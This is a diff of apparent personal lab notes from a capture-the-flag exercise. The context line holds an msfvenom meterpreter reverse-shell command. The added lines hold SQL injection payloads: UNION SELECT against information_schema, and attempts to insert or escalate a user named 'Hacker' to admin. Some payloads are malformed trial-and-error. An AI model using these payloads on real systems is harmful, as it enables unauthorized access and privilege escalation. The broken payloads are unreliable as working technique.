@@ -710,12 +710,56 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.229 lport=6666 -b "\x
 
 
 
+Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
 
 
 
+sqlinjection	members
+                  members	id
+                  members	username
+                  members	password
+                  members	first_name
+                  members	last_name
+                  members	email
+                  members	permission
+    
+
+'OR 1='1 'UNION SET password=password, permission=0
+'UNION SET first_name=Hacker, last_name=Hacker, username=test1, password=password, email=hacker@hacker.com, permission=0
 
 
+'UNION SET first_name=Hacker, last_name=Hacker, username=test1, password=password, email=hacker@hacker.com, permission=0
 
+Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_schema.columns #
+
+
+'OR 1='1 'UNION SELECT first_name, permission from sqlinjection.members #
+
+UPDATE table_name
+SET column1 = value1, column2 = value2, ...
+WHERE condition;
+
+UPDATE Customers
+SET ContactName = 'Alfred Schmidt', City= 'Frankfurt'
+WHERE CustomerID = 1;
+
+'OR 1='1 'UNION UPDATE members 
+SET permission = 0 
+WHERE first_name = 'Hacker';#
+
+UPDATE members
+SET permission = 0
+WHERE first_name = 'Hacker';
+
+
+'INSERT INTO members (password, email, permission) VALUES ('password', 'hacker@mail.com', 1) 
+
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) 
+VALUES ('''', '''', ''', '''', '''', 3) 
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) 
+VALUES ('test2', 'test2', 'test2', 'test2', 'test2', 3) 
 
 
 
